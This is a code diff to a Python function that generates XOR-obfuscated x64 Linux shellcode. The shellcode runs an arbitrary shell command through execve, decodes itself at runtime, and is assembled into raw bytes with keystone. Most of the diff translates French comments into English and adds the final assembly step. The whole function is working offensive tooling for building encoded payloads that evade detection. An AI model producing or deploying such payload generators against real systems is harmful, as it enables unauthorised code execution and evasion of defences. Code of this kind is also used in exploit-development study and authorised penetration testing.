@@ -29,22 +29,17 @@ def encode_string(s: str, xor_key: int = 0x00) -> tuple[list[int], int]:
 
 def generate_shellcode(parsedCommandList: list[str], arch: str = 'x64', xor_key: int = 0x00) -> bytes:
     """
-    Génère un shellcode à partir d'une commande shell.
+    Generates shellcode from a shell command.
     
     Args:
-        command: La commande à exécuter
-        arch: Architecture cible ('x86' ou 'x64')
-        xor_key: Clé XOR pour l'obfuscation
+        command: The command to execute
+        arch: Target architecture ('x86' or 'x64')
+        xor_key: XOR key for obfuscation
     
     Returns:
-        bytes: Le shellcode généré
+        bytes: The generated shellcode
     """
-    # Set up la generation du shellcode
-    # Encode la commande avec la clé XOR
-
-
     accumulatedSize = 0
-    # list2return -> [(int: coef, list: encoded_values), (int: coef, list: encoded_values), ...]
     listArguments = setupToShellcode(parsedCommandList, xor_key)
     print("[+] Liste des arguments : ", listArguments)
     totalSize = 0
@@ -55,9 +50,7 @@ def generate_shellcode(parsedCommandList: list[str], arch: str = 'x64', xor_key:
         if xor_key == 0x00:
             pass
         else:
-
-            print(f"[+] Coef padding pour la cmd: {listArguments[0][0]}")
-            # Début du shellcode
+            # Start of shellcode
             asm = """
             bits 64
             
@@ -65,38 +58,25 @@ def generate_shellcode(parsedCommandList: list[str], arch: str = 'x64', xor_key:
                 xor rax, rax
                 push rax            ; NULL terminator envp
             """
-            
 
-
-
-            #Routine pour les arguments ici par exemple /bin/bash -c 'ls -la' correspond a execve("/bin/bash", ["/bin/bash", "-c", "ls -la"], NULL)
-            #On va donc avoir 3 arguments : "/bin/bash", "-c", "ls -la"
-            #On va donc avoir 3 valeurs encodées
-            #On va donc avoir 3 push rdi
-            #On va donc avoir 3 mov rdi, {hex(value)}
-            #On va donc avoir 3 push rdi
-            
-
-
-
-             #Ajoute les valeurs encodées
+            # Add encoded values
             for value in reversed(listArguments[0][1]):
                 print(f"[+] Value: {value}")
                 asm += f"""
-                mov rdi, {hex(value)}   ; Partie encodée de la commande
+                mov rdi, {hex(value)}   ; Encoded command part
                 push rdi
                 """
             asm += """
-                ;mov rdi, rsp        ; rdi = ptr vers la commande encodée
+                ;mov rdi, rsp        ; rdi = ptr to encoded command
                 """
 
-            # ajouter les arguments ici
+            # Add arguments here
             for i in range(1, len(listArguments)):
                 for value in reversed(listArguments[i][1]):
                     print("[+] On passe au arguments apres la cmd")
                     print(f"[+] Value: {value}")
                     asm += f"""
-                mov rsi, {hex(value)}   ; Partie encodée de la commande
+                mov rsi, {hex(value)}   ; Encoded argument part
                 push rsi
                     """
             
@@ -105,7 +85,7 @@ def generate_shellcode(parsedCommandList: list[str], arch: str = 'x64', xor_key:
                 """
 
             asm += f"""
-                xor rax, rax        ; compteur pour le décodage
+                xor rax, rax        ; counter for decoding
                 jmp xorshellcode
                 
             shellcodeExecution:
@@ -126,21 +106,21 @@ def generate_shellcode(parsedCommandList: list[str], arch: str = 'x64', xor_key:
                 accumulatedSize -= listArguments[i][0]
 
             asm += f"""
-                push rdi            ; ptr vers la commande
-                mov rsi, rsp        ; rsi = argv [commande, NULL]
+                push rdi            ; ptr to command
+                mov rsi, rsp        ; rsi = argv [command, NULL]
                 mov al, 59          ; execve
                 syscall
                 
             xorshellcode:
                 xor byte [rdi+rax], """
             
-            asm += hex(xor_key)     # Ajoute la clé XOR
+            asm += hex(xor_key)     # Add XOR key
             
             asm += """
                 inc rax
                 cmp rax, """
             
-            asm += str(totalSize*8)      # Ajoute la longueur de la commande
+            asm += str(totalSize*8)      # Add command length
             
             asm += """
                 jl xorshellcode
@@ -150,5 +130,16 @@ def generate_shellcode(parsedCommandList: list[str], arch: str = 'x64', xor_key:
             print("ASM:")
             print(asm)
 
+            # Assemble shellcode with keystone
+            try:
+                ks = Ks(KS_ARCH_X86, KS_MODE_64)
+                encoding, count = ks.asm(asm)
+                return bytes(encoding)
+            except KsError as e:
+                print(f"Assembly error: {e}")
+                return None
+
     elif arch == 'x86':
         raise NotImplementedError("x86 is not supported for the moment")
+    
+    return None
